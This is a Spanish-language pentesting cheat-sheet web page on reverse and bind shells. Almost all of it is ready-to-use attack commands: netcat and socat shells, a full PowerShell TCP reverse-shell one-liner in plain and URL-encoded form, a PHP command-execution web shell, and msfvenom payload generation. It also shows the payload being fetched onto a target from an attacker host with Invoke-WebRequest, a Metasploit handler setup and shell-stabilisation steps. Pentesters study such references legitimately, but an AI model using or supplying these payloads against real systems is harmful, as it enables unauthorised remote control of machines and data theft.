<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title class="fab fa-linux">HackSheet Bl3Ak</title>
    <link rel="stylesheet" href="/css/prism.css">
    <link rel="icon" href="/images/logo.ico">
    <link href="/css/estilos.css" rel="stylesheet">
    <link href="/css/button.css" rel="stylesheet">
    <link href="/css/linux.css" rel="stylesheet">


    <script type="module" src="/cmp/mi-footer.js"></script>
    <script src="https://kit.fontawesome.com/f67adc3b08.js" crossorigin="anonymous"></script>

</head>

<body>
    <header class="navbar">
        <img src="/images/logo.gif" class="imglogo" alt="logotipo">
        <a href="/index.html" class="logo">HackSheet</a>
        <div class="menu-toggle "></div>
        <nav>
            <ul>
                <li><a href="/index.html" class="linea-center">Home</a> </li>

            </ul>
        </nav>
        <div class="clearfix"></div>
    </header>
    <script src="https://code.jquery.com/jquery-3.6.0.js"
        integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous">
        </script>

    <script type="text/javascript">
        $(document).ready(function () {
            $('.menu-toggle').click(function () {
                $('.menu-toggle').toggleClass('active')
                $('nav').toggleClass('active')
            })
        })
    </script>


    <div class="main">
        <img class="linux" src="/images/shell.png" alt="Reverse Shell">
        <h1> Reverse shells</h1>
        <ul>
            <li><span class="comando1">Tipos de reverse shell </span>

                <ol>
                    <li><span class="comando2">Netcat</span>
             la navaja suiza de la redes.</li>
                    <li><span class="comando2">Socat</span>
             la navaja suiza de la redes con asteroides.</li>
                    <li><span class="comando2">auxiliary/multi/handler</span>
             modulo de metasploit.</li>
                    <li><span class="comando2">/usr/share/webshells</span>
             WebShells de kali linux.</li>
                    <li><span class="comando2">Pentestmonkey</span>
            
                        <a class="enlace" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
                            target="_blank"><span class="comando1"></span>
                            Link de consulta</a>
                    </li>

                    <li><span class="comando2">Reverse Shell Cheat Shell</span>
            
                        <a class="enlace"
                            href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
                            target="_blank"><span class="comando1"></span>
                            Link de consulta</a>
                    </li>
                    <li>
                        <span class="comando2">Repositorio Reverse Shell</span>
            <a class="enlace"
                            href="https://github.com/danielmiessler/SecLists" target="_blank">
                            <span class="comando1"></span>
                            Link de consulta
                        </a>
                    </li>


                </ol>
            </li>

            <br>
            <li><span class="comando1">Puertos recomendables</span>
     <span class="comando4">80, 53 ó 443   </span>
                <ol>
                    <li><span class="comando5">Estos puertos el listener debe ejecutarse con sudo, con esto puede que
                            supere las reglas del firewall.</span></li>
                </ol>
            </li>
            </li>

            <br>
            <br>

            <div class="pasos">Bind y Reverse Netcat shells</div>
            <li><span class="comando1">Reverse shell</span>
     La victima de conecta al atacante.
                <ol>
                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
            
                        <pre><code class="language-bash line-numbers"data-start="1"
                                >sudo nc -lvnp &lbrack;PORT&rbrack;</code></pre>

                        </span>
                    </li>
                    <li><span class="comando2">Crear una reverse shell en el target </span>
            
                        <pre><code class="language-bash line-numbers"data-start="1"
                            >nc &lbrack;TURN0&rbrack; &lbrack;PORT&rbrack; -e /bin/bash</code></pre>
                        <ol>
                            <span class="comando3">Puede ser tambien un .exe para Windows</span>
                
                            <span class="comando4">"cmd.exe" </span>
                        </ol>
                    </li>
                </ol>
                <ol>
                    <li><span class="comando5">Opcion 2</span></li>
                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
            
                        <pre><code class="language-bash line-numbers"data-start="1"
                            >sudo nc -lvnp &lbrack;PORT&rbrack;</code></pre>

                    </li>
                    <li><span class="comando2">Crear una reverse shell en el target </span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
                            > mkfifo /tmp/f; nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&1; rm /tmp/f</code></pre>
                    </li>
                </ol>
            </li>
            <br>

            <li><span class="comando1">Bind shell</span>
     la victima deja un puerto en escucha para que el atacante se
                conecte.

                <ol>
                    <li><span class="comando2">Crear una reverse shell en el target </span>
                        <pre><code class="language-powershell line-numbers"data-start="1"
                            >nc -lvnp &lbrack;PORT&rbrack; -e "cmd.exe"</code></pre>
                    </li>
                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
                        <pre><code class="language-bash line-numbers"data-start="1"
                                >nc &lbrack;LOCAL IP&rbrack; &lbrack;PORT&rbrack; </code></pre>

                        <ol>
                            <span class="comando3">Puede ser tambien un .exe para Windows</span>
                            <span class="comando4">"cmd.exe" </span>
                        </ol>
                    </li>


                </ol>

                <ol>
                    <li><span class="comando5">Opcion 2</span></li>

                    <li><span class="comando2">Crearemos una bind shell en el target</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >mkfifo /tmp/f; nc -lvnp &lbrack;PORT&rbrack; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f </code></pre>

                    </li>
                    <li><span class="comando2">En nuestra maquina atacante </span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >nc &lbrack;TARGET&rbrack; &lbrack;PORT&rbrack; </code></pre>
                    </li>
                    <br>
                    <img class="center" src="/images/powershell.png" />
                    <div class="titulo">Powershell</div>
                    <li><span class="comando2">Cuando la maquina es Windows</span>

                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;"data-start="1"
                            style="white-space:pre-wrap;">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>

                    </li>
                </ol>
            </li>


            <br>
            <br>
            <div class="pasos">Bind y Reverse Socat shells</div>
            <li><span class="comando1">Reverse shell</span>
                <ol>
                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>

                    </li>
                    <br>
                    <img class="center" src="/images/tux.png" />
                    <div class="titulo">Linux</div>
                    <li><span class="comando2">Crear una reverse shell en el target en
                            Linux</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>

                    </li>
                    <br>
                    <img class="center" src="/images/powershell.png" />
                    <div class="titulo">Powershell</div>
                    <li><span class="comando2">Crear una reverse shell en el target
                            de Windows </span>
                
                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>

                    </li>
                </ol>
            </li>

            <br>
            <li><span class="comando1">Bind shell</span>

                <ol><img class="center" src="/images/tux.png" />
                    <div class="titulo">Linux</div>
                    <li><span class="comando2">Crear una reverse shell en el target en
                            linux </span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >socat TCP-L:&lbrack;PORT&rbrack; EXEC:"bash -li"</code></pre>
                    </li>
                    <br>
                    <img class="center" src="/images/powershell.png" />
                    <div class="titulo">Powershell</div>
                    <li><span class="comando2">Crear una reverse shell en el target
                            en windows </span>
                
                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >socat TCP-L:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>

                    </li>

                    <li><span class="comando2">Creamos el listener en la maquina atacante</span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >socat TCP:&lbrack;TARGET&rbrack;:&lbrack;PORT&rbrack; -</code></pre>

                    </li>

                    <li><span class="comando5">Cuando socat no viene instalado</span></li>

                    <li> <span class="comando2">Por defecto Socat no viene instalado, pero podemos cargar un
                            precompilado
                            socat binary</span>
                 <span class="comando4"></span>
                        <a class="enlace"
                            href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"
                            target="_blank"><span class="comando1"></span>
                            Link de descarga</span></a>
                    </li>
                    <li><span class="comando2">Montar un web server, se tiene que montar donde esta guardado el
                            socat</span>
                
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >sudo python3 -m http.server 80</code></pre>
                    </li>
                    <li><span class="comando2">Montar un web server en la maquina target</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
                        >sudo python –m SimpleHTTPServer</code></pre>

                    </li>




                    <li><span class="comando2">Ir a windows y abrir Powershell</span>
            
                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;socat.exe -outfile C:\\Windows\temp\socat.exe</code></pre>
                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"> Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe</code></pre>
                    </li>
                    <li><span class="comando2">Comprobamos que se subio el archivo</span></li>
                    <li><span class="comando2">Ahora ponemos un listener con socat</span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
                    <li><span class="comando2">Ahora nos vamo a windows y ejecuatamos el comando en powershell</span>
            

                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >socat TCP:&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack; EXEC:powershell.exe,pipes</code></pre>
                    </li>
                </ol>
            </li>

            <br>
            <br>
            <img class="center" src="/images/webpage.png" alt="web">
            <div class="pasos">WebShell</div>

            <li><span class="comando1">Reverse shell</span>
                <ol>
                    <li><span class="comando2">Podemos generar un archivo por medio de Pentestmonkey</span></li>
                    <li><span class="comando2">Creamos un archivo llamado php-reverse-shell.php</span>
            
                        <pre><code class="language-php line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;";?&gt;</code></pre>

                    </li>
                    <li><span class="comando2">Subimos el archivo </span></li>
                    <li><span class="comando2">Al final de la URL le agregamos</span>
            
                        <pre><code class="language-html line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >?cmd=</code></pre>
                    </li>

                    <li><span class="comando2">Probamos con los siguientes comandos, para comprobar que tenemos
                            acceso</span>
                
                        <pre><code class="language-xml line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >ipconfig, whoami, hostname, arch</code></pre>

                    </li>
                    <li><span class="comando2">Si en caso que el php se ejecuta en un Windows Server, necesitamos correr
                            un reverse shell en powershell </span></li>
                    <li><span class="comando2">Modificaresmos el IP y el PORT de la URL Encoded Power </span>
            
                        <pre><code class="language-html line-numbers" style="white-space:pre-wrap;">powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code></pre>
                    </li>
                    <li><span class="comando2">Ponemos un listener en escucha</span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >nc –lvnp</code></pre>

                    </li>
                </ol>

            </li>
            <br>
            <br>
            <img class="center" src="/images/ninja.png" alt="ninja">
            <div class="pasos">Msfvenom</div>
            <li><span class="comando1">Staged Shell</span>
                <ol>
                    <li style="width: 95%;"><span class="comando2">Staged</span>
            

                        se envían en dos partes. La primera parte se llama stager.
                        Este es un fragmento de código que se
                        ejecuta directamente en el servidos.
                        Se conecta de nuevo a un oyente en espera, pero en realidad
                        no contine ningún código de Shell inverso por si mismo. En su lugar, se conecta al oyente y
                        usa
                        la conexión para cargar el payload real, ejecutándola directamente y evitando que toque el
                        disco
                        donde podría ser atrapado por las soluciones de antivirus tradicionales. Por lo tanto, la
                        carga
                        útil se divide en dos partes: una pequeña etapa inicial, luego el código de Shell inverso
                        más
                        voluminoso que de descarga cuando se activa la etapa. El payload por etapas requieren un
                        oyente
                        inicial especial, generalmente el manejador/multiple Metasploit, que se tratara en la
                        siguiente
                        tarea.



                    </li>

                    <li><span class="comando2">Buscamos primero la shell</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >msfvenom --list payloads | grep “&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;”</code></pre>

                        <br>
                        <img class="center" src="/images/powershell.png" />
                        <div class="titulo">Powershell</div>

                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >msfvenom --list payloads | grep “windows/x64/meterpreter/reverse_tcp” </code></pre>

                        <img class="center" src="/images/tux.png" />
                        <div class="titulo">Linux</div>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >msfvenom --list payloads | grep “linux/x86/meterpreter_reverse_tcp" </code></pre>

                </ol>
            </li>
            <li><span class="comando2">Configuramos la shell</span>


                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
                                >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack;</code></pre>

            </li>

            <li><span class="comando2">Generar una reverse shell:</span>

                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTE-PORT&rbrack;</code></pre>


                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>
            </li>
            <li><span class="comando2">Subimos el archivo mediante WebServer</span>

                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >sudo python3 -m http.server 80</code></pre>
            </li>
            <li> <span class="comando2"> Abrimos PowerShell en la maquina objetivo y descargamos la shell</span>
                <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lt;reverse-file&gt; -outfile C:\\Windows\temp\shell.exe</code></pre>


                <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>
            </li>

            <li><span class="comando2">Abrir metasploit</span>

                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >msfconsole -q</code></pre>
                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >use multi/handler</code></pre>
            <li><span class="comando3">Configuramos el PAYLOAD, LHOST Y LPORT</span></li>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >set PAYLOAD &lbrack;PAYLOAD&rbrack;</code></pre>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >set LHOST &lbrack;TURN0&rbrack;</code></pre>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >set LPORT &lbrack;LISTEN-PORT&rbrack;</code></pre>
            <li><span class="comando3">Ejecutamos</span></li>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >exploit -j</code></pre>

            </li>
            <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
                    shell.exe</span>
                <ol>
                    <li><span class="comando3">Damos doble click al ejecutable</span></li>
                </ol>
            </li>
            <li><span class="comando2">En la consola de metasploit vemos que se cargó correctamente</span></li>
            <li><span class="comando2">Nos dice que la session se cargo exitosamenr</span></li>
            <li><span class="comando2">Cargamos la session</span>
                <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >sessions &lbrack;SESSION NUM&rbrack;</code></pre>
            <li><span class="comando3">Entramos a la consola de Windows</span></li>
            </li>

            </ol>
            </li>

            <br>
            <br>
            <li><span class="comando1">Stagless Shell</span>
                <ol>
                    <li style="width: 50%;"><span class="comando2">Stageless</span>
            Son los más comunes, son
                        completamente autónomos en
                        el sentido de que hay una pieza de código que, cuando se ejecuta, envía un Shell inmediatamente
                        al oyente que espera.



                    </li>
                    <li><span class="comando2">Configuramos la shell</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >msfvenom -p &lbrack;PAYLOAD&rbrack; &lbrack;OPTIONS&rbrack; </code></pre>

                    </li>
                    <li><span class="comando2">Generar una reverse shell:</span>

                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=&lbrack;TURN0&rbrack; LPORT=&lbrack;LISTEN-PORT&rbrack;</code></pre>

                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                        >msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.10.10.123 LPORT=443</code></pre>

                    </li>

                    <li><span class="comando2">Subimos el archivo mediante WebServer</span>

                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >sudo python3 -m http.server 80</code></pre>
                    </li>
                    <li><span class="comando2"> Abrimos PowerShell en la maquina objetivo y descargamos la shell</span>
                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;:&lbrack;PORT&rbrack;/&lbrack;REVERSE-FILE&rbrack; -outfile C:\\Windows\temp\shell.exe</code></pre>

                        <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >Invoke-WebRequest -uri http://10.10.10.123:80/shell.exe -outfile C:\\Windows\temp\shell.exe</code></pre>



                    </li>

                    <li><span class="comando2">Habilitamos el listener en nuestra maquina atacante</span>
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >nc -lvp &lbrack;PORT&rbrack; </code></pre>

                    </li>
                    <li><span class="comando2">Nos vamos a Windows y nos metemos a la carpeta donde se almaceno la
                            shell.exe</span>
                        <ol>
                            <li><span class="comando3">Damos doble click al ejecutable</span></li>
                            <li><span class="comando3">Entramos a la consola de Windows</span></li>
                        </ol>
                    </li>
                    <li><span class="comando5">Es recomendable usuar rlwrap para poder estabilizar la shell en
                            windows</span></li>
                </ol>

            </li>


            <br>
            <br>
            <li><span class="comando1">rlwrap</span>
     pasos para generar una shell, nos da acceso al
                historial, el
                autocompletado de pestañas y teclas de flecha inmediatamente despues de recibir un shell, este tipo de
                shell es mucho mas complejo y es tecnicamente particular cuando se trata de una Shell de Windows, que
                son notoriamente dificiles de estabilizar.
                <ol>
                    <li><span class="comando5">Nota se debe seguir utilizando alguna estabilizacion manual si desea usar
                            Ctrl +
                            C dentro del shell </span> </li>
                </ol>


                <ol>
                    <li><span class="comando3">1. Instalar la Shell rlwrap</span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >sudo apt install rlwrap </code></pre>
                    </li>
                    <li><span class="comando2">2. Invocamos un oyente</span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >rlwrap nc -lvp </code></pre>
                    </li>
                    <li><span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>
            
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >Ctrl + z </code></pre>
                    </li>
                    <li><span class="comando2">4. Ejecutar para que se apague el echo de nuesta terminal (solo cuando el
                            objetivo sea Linux)</span>
                
                        <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >stty raw -echo; fg </code></pre>
                    </li>
                </ol>
            </li>

            <br>
            <br>
            <div class="pasos">Tratamiento de TTY</div>
            <br>
            <img class="center" src="/images/python.png" />
            <div class="titulo">Python</div>
            <br>

            <span class="comando3">1. Ejecutar para generar un Shell Bash</span>

            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
            <span class="comando5">Nota: algunos objetivos neceistan especificar la version correcta
                de Pyhon</span>
            <span class="comando5">Reemplazar la version de Pyhon por: Pyhon, Python2 ó
                Python3</span>

            <br>
            <span class="comando2">2. Ejecutar para generar comando como clear</span>

            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >export TERM=xterm </code></pre>

            <span class="comando2">3. Ejecutar el shell en segundo plano usando el comando </span>

            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >Ctrl + z </code></pre>

            <span class="comando2">4. Renovar la terminal de segundo plano</span>

            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >stty raw -echo; fg</code></pre>

            <span class="comando5">Tenga en cuenta que si el Shell muere,
                cualquier entrada en su
                propio terminal no será visible (como resultado de haber desactivado el echo del
                terminal).</span>
            <br>
            <span class="comando5">Solucion, escribir</span>

            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                    >reset</code></pre>






            <br>
            <img class="center" src="/images/bash_icon.png" alt="bash icon">
            <div class="titulo">Bash</div>
            <span class="comando2">1. Ejecutar el siguiente comando </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >script /dev/null -c bash</code></pre>


            <span class="comando2">2. Ejecutar la siguientes teclas </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >Ctrl +z</code></pre>

            <span class="comando2">3. Ejecutar el siguiente comando </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >stty -echo; fg</code></pre>

            <span class="comando2">4. Ejecutar el siguiente comando </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >reset</code></pre>


            <span class="comando2">5. Nos pedira el tipo de terminal </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                >Terminal type? Xterm</code></pre>

            <span class="comando2">6. Configuramos la terminal </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >echo $TERM</code></pre>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >export TERM=xterm</code></pre>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >export SHELL=bash</code></pre>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                            >echo $TERM</code></pre>
            <span class="comando2">7. Configuracion de tamaño de pantalla </span>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                >stty -a</code></pre>
            <span class="comando4">speed 38400 baud; rows 24; columns 80; line = 0;</span></li>
            <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                >stty rows 43 columns 171</code></pre>



            <br>

          


        </ul>
    </div>

    <script src="/javascript/prism.js"></script>

    <mi-footer></mi-footer>
</body>

</html>